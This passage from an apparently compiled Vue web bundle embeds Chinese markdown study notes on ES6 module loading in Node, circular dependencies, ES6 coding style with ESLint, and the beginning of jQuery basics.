};\r\n  this.show = function () {\r\n    console.log(this.sum);\r\n  };\r\n}\r\n\r\nexport let c = new C();\r\n\t\t\t- 上面的脚本mod.js，输出的是一个C的实例。不同的脚本加载这个模块，得到的都是同一个实例。\r\n\t\t\t- // x.js\r\nimport {c} from './mod';\r\nc.add();\r\n\r\n// y.js\r\nimport {c} from './mod';\r\nc.show();\r\n\r\n// main.js\r\nimport './x';\r\nimport './y';\r\n\t\t\t- 现在执行main.js，输出的是1。\r\n\t\t\t- $ babel-node main.js\r\n1\r\n\t\t\t- 这就证明了x.js和y.js加载的都是C的同一个实例。\r\n\r\n### Node 加载\r\n\r\n- 概述\r\n\r\n\t- Node 对 ES6 模块的处理比较麻烦，因为它有自己的 CommonJS 模块格式，与 ES6 模块格式是不兼容的。目前的解决方案是，将两者分开，ES6 模块和 CommonJS 采用各自的加载方案。\r\n\r\nNode 要求 ES6 模块采用.mjs后缀文件名。也就是说，只要脚本文件里面使用import或者export命令，那么就必须采用.mjs后缀名。require命令不能加载.mjs文件，会报错，只有import命令才可以加载.mjs文件。反过来，.mjs文件里面也不能使用require命令，必须使用import。\r\n\r\n目前，这项功能还在试验阶段。安装 Node v8.5.0 或以上版本，要用--experimental-modules参数才能打开该功能。\r\n\t- $ node --experimental-modules my-app.mjs\r\n\t- 为了与浏览器的import加载规则相同，Node 的.mjs文件支持 URL 路径。\r\n\t- import './foo?query=1'; // 加载 ./foo 传入参数 ?query=1\r\n\t- 上面代码中，脚本路径带有参数?query=1，Node 会按 URL 规则解读。同一个脚本只要参数不同，就会被加载多次，并且保存成不同的缓存。由于这个原因，只要文件名中含有:、%、#、?等特殊字符，最好对这些字符进行转义。\r\n\r\n目前，Node 的import命令只支持加载本地模块（file:协议），不支持加载远程模块。\r\n\t- 如果模块名不含路径，那么import命令会去node_modules目录寻找这个模块。\r\n\t- import 'baz';\r\nimport 'abc/123';\r\n\t- 如果模块名包含路径，那么import命令会按照路径去寻找这个名字的脚本文件。\r\n\t- import 'file:///etc/config/app.json';\r\nimport './foo';\r\nimport './foo?search';\r\nimport '../bar';\r\nimport '/baz';\r\n\t- 如果脚本文件省略了后缀名，比如import './foo'，Node 会依次尝试四个后缀名：./foo.mjs、./foo.js、./foo.json、./foo.node。如果这些脚本文件都不存在，Node 就会去加载./foo/package.json的main字段指定的脚本。如果./foo/package.json不存在或者没有main字段，那么就会依次加载./foo/index.mjs、./foo/index.js、./foo/index.json、./foo/index.node。如果以上四个文件还是都不存在，就会抛出错误。\r\n\r\n最后，Node 的import命令是异步加载，这一点与浏览器的处理方法相同。\r\n\r\n- 内部变量 \r\n\r\n\t- ES6 模块应该是通用的，同一个模块不用修改，就可以用在浏览器环境和服务器环境。为了达到这个目标，Node 规定 ES6 模块之中不能使用 CommonJS 模块的特有的一些内部变量。\r\n\r\n\t\t- 首先，就是this关键字。ES6 模块之中，顶层的this指向undefined；CommonJS 模块的顶层this指向当前模块，这是两者的一个重大差异。\r\n\t\t- 其次，以下这些顶层变量在 ES6 模块之中都是不存在的。\r\n\r\n\t\t\t- arguments\r\n\t\t\t- require\r\n\t\t\t- module\r\n\t\t\t- exports\r\n\t\t\t- __filename\r\n\t\t\t- __dirname\r\n\r\n\t\t- 如果你一定要使用这些变量，有一个变通方法，就是写一个 CommonJS 模块输出这些变量，然后再用 ES6 模块加载这个 CommonJS 模块。但是这样一来，该 ES6 模块就不能直接用于浏览器环境了，所以不推荐这样做。\r\n\r\n\t\t\t- // expose.js\r\nmodule.exports = {__dirname};\r\n\r\n// use.mjs\r\nimport expose from './expose.js';\r\nconst {__dirname} = expose;\r\n\t\t\t- 上面代码中，expose.js是一个 CommonJS 模块，输出变量__dirname，该变量在 ES6 模块之中不存在。ES6 模块加载expose.js，就可以得到__dirname。\r\n\r\n- ES6 模块加载 CommonJS 模块\r\n\r\n\t- CommonJS 模块的输出都定义在module.exports这个属性上面。Node 的import命令加载 CommonJS 模块，Node 会自动将module.exports属性，当作模块的默认输出，即等同于export default xxx。\r\n\r\n\t\t- 下面是一个 CommonJS 模块。\r\n\r\n\t\t\t- // a.js\r\nmodule.exports = {\r\n  foo: 'hello',\r\n  bar: 'world'\r\n};\r\n\r\n// 等同于\r\nexport default {\r\n  foo: 'hello',\r\n  bar: 'world'\r\n};\r\n\t\t\t- import命令加载上面的模块，module.exports会被视为默认输出，即import命令实际上输入的是这样一个对象{ default: module.exports }。\r\n\t\t\t- 所以，一共有三种写法，可以拿到 CommonJS 模块的module.exports。\r\n\t\t\t- // 写法一\r\nimport baz from './a';\r\n// baz = {foo: 'hello', bar: 'world'};\r\n\r\n// 写法二\r\nimport {default as baz} from './a';\r\n// baz = {foo: 'hello', bar: 'world'};\r\n\r\n// 写法三\r\nimport * as baz from './a';\r\n// baz = {\r\n//   get default() {return module.exports;},\r\n//   get foo() {return this.default.foo}.bind(baz),\r\n//   get bar() {return this.default.bar}.bind(baz)\r\n// }\r\n\t\t\t- 上面代码的第三种写法，可以通过baz.default拿到module.exports。foo属性和bar属性就是可以通过这种方法拿到了module.exports。\r\n\r\n\t\t- 下面是一些例子\r\n\r\n\t\t\t- // b.js\r\nmodule.exports = null;\r\n\r\n// es.js\r\nimport foo from './b';\r\n// foo = null;\r\n\r\nimport * as bar from './b';\r\n// bar = { default:null };\r\n\r\n\t\t\t\t- 上面代码中，es.js采用第二种写法时，要通过bar.default这样的写法，才能拿到module.exports。\r\n\r\n\t\t\t- // c.js\r\nmodule.exports = function two() {\r\n  return 2;\r\n};\r\n\r\n// es.js\r\nimport foo from './c';\r\nfoo(); // 2\r\n\r\nimport * as bar from './c';\r\nbar.default(); // 2\r\nbar(); // throws, bar is not a function\r\n\r\n\t\t\t\t- 上面代码中，bar本身是一个对象，不能当作函数调用，只能通过bar.default调用。\r\n\r\n\t\t\t- CommonJS 模块的输出缓存机制，在 ES6 加载方式下依然有效。\r\n\r\n\t\t\t\t- // foo.js\r\nmodule.exports = 123;\r\nsetTimeout(_ => module.exports = null);\r\n\r\n\t\t\t\t\t- 上面代码中，对于加载foo.js的脚本，module.exports将一直是123，而不会变成null。\r\n\r\n\t\t\t- 由于 ES6 模块是编译时确定输出接口，CommonJS 模块是运行时确定输出接口，所以采用import命令加载 CommonJS 模块时，不允许采用下面的写法。\r\n\r\n\t\t\t\t- // 不正确\r\nimport { readFile } from 'fs';\r\n\r\n\t\t\t\t\t- 上面的写法不正确，因为fs是 CommonJS 格式，只有在运行时才能确定readFile接口，而import命令要求编译时就确定这个接口。解决方法就是改为整体输入。\r\n\t\t\t\t\t- // 正确的写法一\r\nimport * as express from 'express';\r\nconst app = express.default();\r\n\r\n// 正确的写法二\r\nimport express from 'express';\r\nconst app = express();\r\n\r\n- CommonJS 模块加载 ES6 模块\r\n\r\n\t- CommonJS 模块加载 ES6 模块，不能使用require命令，而要使用import()函数。ES6 模块的所有输出接口，会成为输入对象的属性。\r\n\r\n\t\t- // es.mjs\r\nlet foo = { bar: 'my-default' };\r\nexport default foo;\r\n\r\n// cjs.js\r\nconst es_namespace = await import('./es.mjs');\r\n// es_namespace = {\r\n//   get default() {\r\n//     ...\r\n//   }\r\n// }\r\nconsole.log(es_namespace.default);\r\n// { bar:'my-default' }\r\n\t\t- 上面代码中，default接口变成了es_namespace.default属性。\r\n\t\t- 下面是另一个例子。\r\n\t\t- // es.js\r\nexport let foo = { bar:'my-default' };\r\nexport { foo as bar };\r\nexport function f() {};\r\nexport class c {};\r\n\r\n// cjs.js\r\nconst es_namespace = await import('./es');\r\n// es_namespace = {\r\n//   get foo() {return foo;}\r\n//   get bar() {return foo;}\r\n//   get f() {return f;}\r\n//   get c() {return c;}\r\n// }\r\n\r\n### 循环加载\r\n\r\n- “循环加载”（circular dependency）指的是，a脚本的执行依赖b脚本，而b脚本的执行又依赖a脚本。\r\n\r\n\t- // a.js\r\nvar b = require('b');\r\n\r\n// b.js\r\nvar a = require('a');\r\n\t- 通常，“循环加载”表示存在强耦合，如果处理不好，还可能导致递归加载，使得程序无法执行，因此应该避免出现。\r\n\r\n但是实际上，这是很难避免的，尤其是依赖关系复杂的大项目，很容易出现a依赖b，b依赖c，c又依赖a这样的情况。这意味着，模块加载机制必须考虑“循环加载”的情况。\r\n\r\n对于 JavaScript 语言来说，目前最常见的两种模块格式 CommonJS 和 ES6，处理“循环加载”的方法是不一样的，返回的结果也不一样。\r\n\r\n- CommonJS 模块的加载原理\r\n\r\n\t- CommonJS 的一个模块，就是一个脚本文件。require命令第一次加载该脚本，就会执行整个脚本，然后在内存生成一个对象。\r\n\r\n\t\t- {\r\n  id: '...',\r\n  exports: { ... },\r\n  loaded: true,\r\n  ...\r\n}\r\n\t\t- 上面代码就是 Node 内部加载模块后生成的一个对象。该对象的id属性是模块名，exports属性是模块输出的各个接口，loaded属性是一个布尔值，表示该模块的脚本是否执行完毕。其他还有很多属性，这里都省略了。\r\n\t\t- 以后需要用到这个模块的时候，就会到exports属性上面取值。即使再次执行require命令，也不会再次执行该模块，而是到缓存之中取值。也就是说，CommonJS 模块无论加载多少次，都只会在第一次加载时运行一次，以后再加载，就返回第一次运行的结果，除非手动清除系统缓存。\r\n\r\n- CommonJS 模块的循环加载\r\n\r\n\t- CommonJS 模块的重要特性是加载时执行，即脚本代码在require的时候，就会全部执行。一旦出现某个模块被\"循环加载\"，就只输出已经执行的部分，还未执行的部分不会输出\r\n\r\n\t\t- 让我们来看，Node 官方文档里面的例子。脚本文件a.js代码如下。\r\n\r\n\t\t\t- exports.done = false;\r\nvar b = require('./b.js');\r\nconsole.log('在 a.js 之中，b.done = %j', b.done);\r\nexports.done = true;\r\nconsole.log('a.js 执行完毕');\r\n\t\t\t- 上面代码之中，a.js脚本先输出一个done变量，然后加载另一个脚本文件b.js。注意，此时a.js代码就停在这里，等待b.js执行完毕，再往下执行。\r\n\t\t\t- 再看b.js的代码。\r\n\t\t\t- exports.done = false;\r\nvar a = require('./a.js');\r\nconsole.log('在 b.js 之中，a.done = %j', a.done);\r\nexports.done = true;\r\nconsole.log('b.js 执行完毕');\r\n\t\t\t- 上面代码之中，b.js执行到第二行，就会去加载a.js，这时，就发生了“循环加载”。系统会去a.js模块对应对象的exports属性取值，可是因为a.js还没有执行完，从exports属性只能取回已经执行的部分，而不是最后的值。\r\n\t\t\t- a.js已经执行的部分，只有一行。\r\n\t\t\t- exports.done = false;\r\n\t\t\t- 因此，对于b.js来说，它从a.js只输入一个变量done，值为false。\r\n\r\n然后，b.js接着往下执行，等到全部执行完毕，再把执行权交还给a.js。于是，a.js接着往下执行，直到执行完毕。我们写一个脚本main.js，验证这个过程。\r\n\t\t\t- var a = require('./a.js');\r\nvar b = require('./b.js');\r\nconsole.log('在 main.js 之中, a.done=%j, b.done=%j', a.done, b.done);\r\n\t\t\t- 执行main.js，运行结果如下。\r\n\r\n\t\t\t\t- $ node main.js\r\n\r\n在 b.js 之中，a.done = false\r\nb.js 执行完毕\r\n在 a.js 之中，b.done = true\r\na.js 执行完毕\r\n在 main.js 之中, a.done=true, b.done=true\r\n\r\n\t\t\t- 上面的代码证明了两件事。一是，在b.js之中，a.js没有执行完毕，只执行了第一行。二是，main.js执行到第二行时，不会再次执行b.js，而是输出缓存的b.js的执行结果，即它的第四行。\r\n\t\t\t- exports.done = true;\r\n\t\t\t- 总之，CommonJS 输入的是被输出值的拷贝，不是引用。\r\n\r\n另外，由于 CommonJS 模块遇到循环加载时，返回的是当前已经执行的部分的值，而不是代码全部执行后的值，两者可能会有差异。所以，输入变量的时候，必须非常小心。\r\n\r\n\t\t\t\t- var a = require('a'); // 安全的写法\r\nvar foo = require('a').foo; // 危险的写法\r\n\r\nexports.good = function (arg) {\r\n  return a.foo('good', arg); // 使用的是 a.foo 的最新值\r\n};\r\n\r\nexports.bad = function (arg) {\r\n  return foo('bad', arg); // 使用的是一个部分加载时的值\r\n};\r\n\t\t\t\t- 上面代码中，如果发生循环加载，require('a').foo的值很可能后面会被改写，改用require('a')会更保险一点。\r\n\r\n- ES6 模块的循环加载 \r\n\r\n\t- ES6 处理“循环加载”与 CommonJS 有本质的不同。ES6 模块是动态引用，如果使用import从一个模块加载变量（即import foo from 'foo'），那些变量不会被缓存，而是成为一个指向被加载模块的引用，需要开发者自己保证，真正取值的时候能够取到值。\r\n\r\n\t\t- 请看下面这个例子。\r\n\r\n\t\t\t- // a.mjs\r\nimport {bar} from './b';\r\nconsole.log('a.mjs');\r\nconsole.log(bar);\r\nexport let foo = 'foo';\r\n\r\n// b.mjs\r\nimport {foo} from './a';\r\nconsole.log('b.mjs');\r\nconsole.log(foo);\r\nexport let bar = 'bar';\r\n\t\t\t- 上面代码中，a.mjs加载b.mjs，b.mjs又加载a.mjs，构成循环加载。执行a.mjs，结果如下。\r\n\t\t\t- $ node --experimental-modules a.mjs\r\nb.mjs\r\nReferenceError: foo is not defined\r\n\t\t\t- 上面代码中，执行a.mjs以后会报错，foo变量未定义，这是为什么？\r\n\r\n让我们一行行来看，ES6 循环加载是怎么处理的。首先，执行a.mjs以后，引擎发现它加载了b.mjs，因此会优先执行b.mjs，然后再执行a.mjs。接着，执行b.mjs的时候，已知它从a.mjs输入了foo接口，这时不会去执行a.mjs，而是认为这个接口已经存在了，继续往下执行。执行到第三行console.log(foo)的时候，才发现这个接口根本没定义，因此报错。\r\n\r\n解决这个问题的方法，就是让b.mjs运行的时候，foo已经有定义了。这可以通过将foo写成函数来解决。\r\n\t\t\t- // a.mjs\r\nimport {bar} from './b';\r\nconsole.log('a.mjs');\r\nconsole.log(bar());\r\nfunction foo() { return 'foo' }\r\nexport {foo};\r\n\r\n// b.mjs\r\nimport {foo} from './a';\r\nconsole.log('b.mjs');\r\nconsole.log(foo());\r\nfunction bar() { return 'bar' }\r\nexport {bar};\r\n\r\n\t\t\t\t- 这时再执行a.mjs就可以得到预期结果。\r\n\r\n\t\t\t\t\t- $ node --experimental-modules a.mjs\r\nb.mjs\r\nfoo\r\na.mjs\r\nbar\r\n\r\n\t\t\t- 这是因为函数具有提升作用，在执行import {bar} from './b'时，函数foo就已经有定义了，所以b.mjs加载的时候不会报错。这也意味着，如果把函数foo改写成函数表达式，也会报错。\r\n\r\n\t\t\t\t- // a.mjs\r\nimport {bar} from './b';\r\nconsole.log('a.mjs');\r\nconsole.log(bar());\r\nconst foo = () => 'foo';\r\nexport {foo};\r\n\t\t\t\t- 上面代码的第四行，改成了函数表达式，就不具有提升作用，执行就会报错。\r\n\r\n## 编程风格\r\n\r\n### 块级作用域\r\n\r\n- （1）let 取代 var\r\n- （2）全局常量和线程安全\r\n\r\n\t- 在let和const之间，建议优先使用const，尤其是在全局环境，不应该设置变量，只应设置常量。\r\n\r\n\t\t- const优于let有几个原因。\r\n\r\n\t\t\t- 一个是const可以提醒阅读程序的人，这个变量不应该改变\r\n\t\t\t- 另一个是const比较符合函数式编程思想，运算不改变值，只是新建值，而且这样也有利于将来的分布式运算\r\n\t\t\t- 最后一个原因是 JavaScript 编译器会对const进行优化，所以多使用const，有利于提高程序的运行效率，也就是说let和const的本质区别，其实是编译器内部的处理不同。\r\n\r\n\t\t- // bad\r\nvar a = 1, b = 2, c = 3;\r\n\r\n// good\r\nconst a = 1;\r\nconst b = 2;\r\nconst c = 3;\r\n\r\n// best\r\nconst [a, b, c] = [1, 2, 3];\r\n\t\t- const声明常量还有两个好处\r\n\r\n\t\t\t- 一是阅读代码的人立刻会意识到不应该修改这个值\r\n\t\t\t- 二是防止了无意间修改变量值所导致的错误。\r\n\r\n\t\t- 所有的函数都应该设置为常量。\r\n\r\n### 字符串\r\n\r\n- 静态字符串一律使用单引号或反引号，不使用双引号。动态字符串使用反引号。\r\n\r\n\t- // bad\r\nconst a = \"foobar\";\r\nconst b = 'foo' + a + 'bar';\r\n\r\n// acceptable\r\nconst c = `foobar`;\r\n\r\n// good\r\nconst a = 'foobar';\r\nconst b = `foo${a}bar`;\r\n\r\n### 解构赋值\r\n\r\n- 使用数组成员对变量赋值时，优先使用解构赋值。\r\n\r\n\t- const arr = [1, 2, 3, 4];\r\n\r\n// bad\r\nconst first = arr[0];\r\nconst second = arr[1];\r\n\r\n// good\r\nconst [first, second] = arr;\r\n\r\n- 函数的参数如果是对象的成员，优先使用解构赋值。\r\n\r\n\t- // bad\r\nfunction getFullName(user) {\r\n  const firstName = user.firstName;\r\n  const lastName = user.lastName;\r\n}\r\n\r\n// good\r\nfunction getFullName(obj) {\r\n  const { firstName, lastName } = obj;\r\n}\r\n\r\n// best\r\nfunction getFullName({ firstName, lastName }) {\r\n}\r\n\r\n- 如果函数返回多个值，优先使用对象的解构赋值，而不是数组的解构赋值。这样便于以后添加返回值，以及更改返回值的顺序。\r\n\r\n\t- // bad\r\nfunction processInput(input) {\r\n  return [left, right, top, bottom];\r\n}\r\n\r\n// good\r\nfunction processInput(input) {\r\n  return { left, right, top, bottom };\r\n}\r\n\r\nconst { left, right } = processInput(input);\r\n\r\n### 对象\r\n\r\n- 单行定义的对象，最后一个成员不以逗号结尾。多行定义的对象，最后一个成员以逗号结尾。\r\n\r\n\t- // bad\r\nconst a = { k1: v1, k2: v2, };\r\nconst b = {\r\n  k1: v1,\r\n  k2: v2\r\n};\r\n\r\n// good\r\nconst a = { k1: v1, k2: v2 };\r\nconst b = {\r\n  k1: v1,\r\n  k2: v2,\r\n};\r\n\r\n- 对象尽量静态化，一旦定义，就不得随意添加新的属性。如果添加属性不可避免，要使用Object.assign方法。\r\n\r\n\t- // bad\r\nconst a = {};\r\na.x = 3;\r\n\r\n// if reshape unavoidable\r\nconst a = {};\r\nObject.assign(a, { x: 3 });\r\n\r\n// good\r\nconst a = { x: null };\r\na.x = 3;\r\n\r\n- 如果对象的属性名是动态的，可以在创造对象的时候，使用属性表达式定义。\r\n\r\n\t- // bad\r\nconst obj = {\r\n  id: 5,\r\n  name: 'San Francisco',\r\n};\r\nobj[getKey('enabled')] = true;\r\n\r\n// good\r\nconst obj = {\r\n  id: 5,\r\n  name: 'San Francisco',\r\n  [getKey('enabled')]: true,\r\n};\r\n\t- 上面代码中，对象obj的最后一个属性名，需要计算得到。这时最好采用属性表达式，在新建obj的时候，将该属性与其他属性定义在一起。这样一来，所有属性就在一个地方定义了。\r\n\r\n- 另外，对象的属性和方法，尽量采用简洁表达法，这样易于描述和书写。\r\n\r\n\t- var ref = 'some value';\r\n\r\n// bad\r\nconst atom = {\r\n  ref: ref,\r\n\r\n  value: 1,\r\n\r\n  addValue: function (value) {\r\n    return atom.value + value;\r\n  },\r\n};\r\n\r\n// good\r\nconst atom = {\r\n  ref,\r\n\r\n  value: 1,\r\n\r\n  addValue(value) {\r\n    return atom.value + value;\r\n  },\r\n};\r\n\r\n### 数组\r\n\r\n- 使用扩展运算符（...）拷贝数组。\r\n\r\n\t- // bad\r\nconst len = items.length;\r\nconst itemsCopy = [];\r\nlet i;\r\n\r\nfor (i = 0; i < len; i++) {\r\n  itemsCopy[i] = items[i];\r\n}\r\n\r\n// good\r\nconst itemsCopy = [...items];\r\n\r\n- 使用 Array.from 方法，将类似数组的对象转为数组。\r\n\r\n\t- const foo = document.querySelectorAll('.foo');\r\nconst nodes = Array.from(foo);\r\n\r\n### Map 结构\r\n\r\n- 注意区分 Object 和 Map，只有模拟现实世界的实体对象时，才使用 Object。如果只是需要key: value的数据结构，使用 Map 结构。因为 Map 有内建的遍历机制。\r\n\r\n\t- let map = new Map(arr);\r\n\r\nfor (let key of map.keys()) {\r\n  console.log(key);\r\n}\r\n\r\nfor (let value of map.values()) {\r\n  console.log(value);\r\n}\r\n\r\nfor (let item of map.entries()) {\r\n  console.log(item[0], item[1]);\r\n}\r\n\r\n### Class\r\n\r\n- 总是用 Class，取代需要 prototype 的操作。因为 Class 的写法更简洁，更易于理解。\r\n\r\n\t- // bad\r\nfunction Queue(contents = []) {\r\n  this._queue = [...contents];\r\n}\r\nQueue.prototype.pop = function() {\r\n  const value = this._queue[0];\r\n  this._queue.splice(0, 1);\r\n  return value;\r\n}\r\n\r\n// good\r\nclass Queue {\r\n  constructor(contents = []) {\r\n    this._queue = [...contents];\r\n  }\r\n  pop() {\r\n    const value = this._queue[0];\r\n    this._queue.splice(0, 1);\r\n    return value;\r\n  }\r\n}\r\n\r\n- 使用extends实现继承，因为这样更简单，不会有破坏instanceof运算的危险。\r\n\r\n\t- // bad\r\nconst inherits = require('inherits');\r\nfunction PeekableQueue(contents) {\r\n  Queue.apply(this, contents);\r\n}\r\ninherits(PeekableQueue, Queue);\r\nPeekableQueue.prototype.peek = function() {\r\n  return this._queue[0];\r\n}\r\n\r\n// good\r\nclass PeekableQueue extends Queue {\r\n  peek() {\r\n    return this._queue[0];\r\n  }\r\n}\r\n\r\n### 模块\r\n\r\n- 首先，Module 语法是 JavaScript 模块的标准写法，坚持使用这种写法。使用import取代require。\r\n\r\n\t- // bad\r\nconst moduleA = require('moduleA');\r\nconst func1 = moduleA.func1;\r\nconst func2 = moduleA.func2;\r\n\r\n// good\r\nimport { func1, func2 } from 'moduleA';\r\n\r\n- 使用export取代module.exports。\r\n\r\n\t- // commonJS的写法\r\nvar React = require('react');\r\n\r\nvar Breadcrumbs = React.createClass({\r\n  render() {\r\n    return <nav />;\r\n  }\r\n});\r\n\r\nmodule.exports = Breadcrumbs;\r\n\r\n// ES6的写法\r\nimport React from 'react';\r\n\r\nclass Breadcrumbs extends React.Component {\r\n  render() {\r\n    return <nav />;\r\n  }\r\n};\r\n\r\nexport default Breadcrumbs;\r\n\t- 如果模块只有一个输出值，就使用export default，如果模块有多个输出值，就不使用export default，export default与普通的export不要同时使用。\r\n\r\n- 不要在模块输入中使用通配符。因为这样可以确保你的模块之中，有一个默认输出（export default）。\r\n\r\n\t- // bad\r\nimport * as myObject from './importModule';\r\n\r\n// good\r\nimport myObject from './importModule';\r\n\r\n- 如果模块默认输出一个函数，函数名的首字母应该小写。\r\n\r\n\t- function makeStyleGuide() {\r\n}\r\n\r\nexport default makeStyleGuide;\r\n\r\n- 如果模块默认输出一个对象，对象名的首字母应该大写。\r\n\r\n\t- const StyleGuide = {\r\n  es6: {\r\n  }\r\n};\r\n\r\nexport default StyleGuide;\r\n\r\n### ESLint 的使用\r\n\r\n- ESLint 是一个语法规则和代码风格的检查工具，可以用来保证写出语法正确、风格统一的代码。\r\n\r\n\t- 首先，安装 ESLint。\r\n\r\n\t\t- $ npm i -g eslint\r\n\r\n\t- 然后，安装 Airbnb 语法规则，以及 import、a11y、react 插件。\r\n\r\n\t\t- $ npm i -g eslint-config-airbnb\r\n$ npm i -g eslint-plugin-import eslint-plugin-jsx-a11y eslint-plugin-react\r\n\r\n\t- 最后，在项目的根目录下新建一个.eslintrc文件，配置 ESLint。\r\n\r\n\t\t- {\r\n  \"extends\": \"eslint-config-airbnb\"\r\n}\r\n\r\n\t- 现在就可以检查，当前项目的代码是否符合预设的规则。\r\n\r\n\t\t- index.js文件的代码如下。\r\n\r\n\t\t\t- var unusued = 'I have no purpose!';\r\n\r\nfunction greet() {\r\n    var message = 'Hello, World!';\r\n    alert(message);\r\n}\r\n\r\ngreet();\r\n\t\t\t- 使用 ESLint 检查这个文件，就会报出错误。\r\n\t\t\t- $ eslint index.js\r\nindex.js\r\n  1:1  error  Unexpected var, use let or const instead          no-var\r\n  1:5  error  unusued is defined but never used                 no-unused-vars\r\n  4:5  error  Expected indentation of 2 characters but found 4  indent\r\n  4:5  error  Unexpected var, use let or const instead          no-var\r\n  5:5  error  Expected indentation of 2 characters but found 4  indent\r\n\r\n✖ 5 problems (5 errors, 0 warnings)\r\n\t\t\t- 上面代码说明，原文件有五个错误，其中两个是不应该使用var命令，而要使用let或const；一个是定义了变量，却没有使用；另外两个是行首缩进为 4 个空格，而不是规定的 2 个空格。\r\n\r\n### 函数\r\n\r\n- 立即执行函数可以写成箭头函数的形式。\r\n\r\n\t- (() => {\r\n  console.log('Welcome to the Internet.');\r\n})();\r\n\r\n- 那些需要使用函数表达式的场合，尽量用箭头函数代替。因为这样更简洁，而且绑定了 this。\r\n\r\n\t- // bad\r\n[1, 2, 3].map(function (x) {\r\n  return x * x;\r\n});\r\n\r\n// good\r\n[1, 2, 3].map((x) => {\r\n  return x * x;\r\n});\r\n\r\n// best\r\n[1, 2, 3].map(x => x * x);\r\n\r\n- 箭头函数取代Function.prototype.bind，不应再用 self/_this/that 绑定 this。\r\n\r\n\t- // bad\r\nconst self = this;\r\nconst boundMethod = function(...params) {\r\n  return method.apply(self, params);\r\n}\r\n\r\n// acceptable\r\nconst boundMethod = method.bind(this);\r\n\r\n// best\r\nconst boundMethod = (...params) => method.apply(this, params);\r\n\t- 简单的、单行的、不会复用的函数，建议采用箭头函数。如果函数体较为复杂，行数较多，还是应该采用传统的函数写法。\r\n\r\n- 所有配置项都应该集中在一个对象，放在最后一个参数，布尔值不可以直接作为参数。\r\n\r\n\t- // bad\r\nfunction divide(a, b, option = false ) {\r\n}\r\n\r\n// good\r\nfunction divide(a, b, { option = false } = {}) {\r\n}\r\n\r\n- 不要在函数体内使用 arguments 变量，使用 rest 运算符（...）代替。因为 rest 运算符显式表明你想要获取参数，而且 arguments 是一个类似数组的对象，而 rest 运算符可以提供一个真正的数组。\r\n\r\n\t- // bad\r\nfunction concatenateAll() {\r\n  const args = Array.prototype.slice.call(arguments);\r\n  return args.join('');\r\n}\r\n\r\n// good\r\nfunction concatenateAll(...args) {\r\n  return args.join('');\r\n}\r\n\r\n- 使用默认值语法设置函数参数的默认值。\r\n\r\n\t- // bad\r\nfunction handleThings(opts) {\r\n  opts = opts || {};\r\n}\r\n\r\n// good\r\nfunction handleThings(opts = {}) {\r\n  // ...\r\n}\r\n\r\n",dt={data:function(){return{MainComponent:mt}}},gt=dt,bt=Object(u["a"])(gt,pt,ut,!1,null,"7cd51b2f",null),vt=bt.exports,ht=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},St=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"line number1 index0 alt2"},[t("code",{staticClass:"javascript plain"},[n._v("str.replace(/")]),t("code",{staticClass:"javascript keyword"},[n._v("class")]),t("code",{staticClass:"javascript plain"},[n._v('=[\\"|')]),t("code",{staticClass:"javascript string"},[n._v("'](.*?)[\\\"|'")]),t("code",{staticClass:"javascript plain"},[n._v("].*?/g, ")]),t("code",{staticClass:"javascript string"},[n._v("''")]),t("code",{staticClass:"javascript plain"},[n._v(")")])])])}],yt={},ft=yt,_t=Object(u["a"])(ft,ht,St,!1,null,"ffe97eb4",null),xt=_t.exports,wt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Et=[],Tt="# Jquery\r\n\r\n## 1.优点\r\n\r\n### 1.隐私迭代\r\n\r\n- 自动遍历元素\r\n\r\n### 2.链式编程\r\n\r\n- 用白话说：可以一直点下去\r\n\r\n## 2.入口函数（如果写在html的上面，一定要有入口函数）\r\n\r\n### 1.$（function () { } ）\r\n\r\n### 2.$(document).ready（function（）{ } ）\r\n\r\n## 3.顶级对象\r\n\r\n### $\r\n\r\n## 4.相互转换\r\n\r\n### 1.DOM对象==>jQuery对象\r\n\r\n- 例如：$(btn)\r\n\r\n\t- 注意（）括号里面直接使用DOM对象，不用加‘’引号\r\n\r\n### 2.jQuery==>DOM对象\r\n\r\n- 1.$('input')[0]\r\n- 2.$('input').get[0]\r\n\r\n## 5.方法\r\n\r\n### 1.获取索引\r\n\r\n- index()\r\n\r\n\t- 可以获取当前伪数组的索引\r\n\r\n### 2.属性操作\r\n\r\n- 1.基本（固有）属性\r\n\r\n\t- prop();\r\n\r\n\t\t- 1.一个值伪获取\r\n\t\t- 2.二个值伪设置\r\n\r\n- 2.自定义属性\r\n\r\n\t- attr();\r\n\r\n\t\t- 1.一个值伪获取\r\n\t\t- 2.二个值伪设置\r\n\r\n### 3.内容文本值\r\n\r\n- 1.html() \r\n\r\n\t- 大多数 双标签使用\r\n\r\n- 2.text()\r\n\r\n\t- 大多数 双标签使用\r\n\r\n- 3.val()\r\n\r\n\t- 大多数 表单使用\r\n\r\n### 4.获取祖先元素\r\n\r\n- parents()\r\n\r\n### 5.遍历\r\n\r\n- 1.遍历元素\r\n\r\n\t- jQuery对象.each(function(参数1，参数2){\r\n})\r\n参数1：每个元素的索引号\r\n参数2：这里是DOM的元素对象，需要转为JQ的对象\r\n\r\n- 2.遍历数据\r\n\r\n\t- $.each（遍历谁，function(){\r\n}）\r\n参数1：是每个元素的索引号;   \r\n参数2：遍历内容\r\n\r\n### 6.元素操作\r\n\r\n- 1.创建元素\r\n\r\n\t- $(\"<li></li>\")\r\n\r\n- 2.添加元素（父子关系）\r\n\r\n\t- append();\r\n\t- prepend();\r\n\r\n- 3.外部添加（兄弟关系）\r\n\r\n\t- after();\r\n\t- before();\r\n\r\n- 4.删除元素\r\n\r\n\t- remove（）把整个元素i清空\r\n\t- empty（）把内容i清空\r\n\t- html('')=>添加空的字符串\r\n\r\n## 6.选择器\r\n\r\n### 1.基本\r\n\r\n- 1.标签名 $('div')\r\n- 2.id名$('#div')\r\n- 3.* $('*')\r\n- 4.class名 $('.box')\r\n- 5.获取多个 $('p,img')\r\n- 6.交集 $('p.c1')\r\n- 7.子代 $('p>span')\r\n- 8.后代 $('p span')\r\n\r\n### 2.筛选选择器\r\n\r\n- 1.第一个元素 $('li:first')\r\n- 2.最后一个元素 $('li:last')\r\n- 3.\"索引\"为2的元素 $('li:eq(2)')\r\n- 4.索引为奇数 $('li:odd')\r\n- 5.索引为偶数 $('li:even')\r\n\r\n### 3.筛选方法\r\n\r\n- 1.父级 \r\n\r\n\t- $('li.parent()')\r\n\r\n- 2.子级\r\n\r\n\t- $(’li‘).children()\r\n\t- 一个儿子 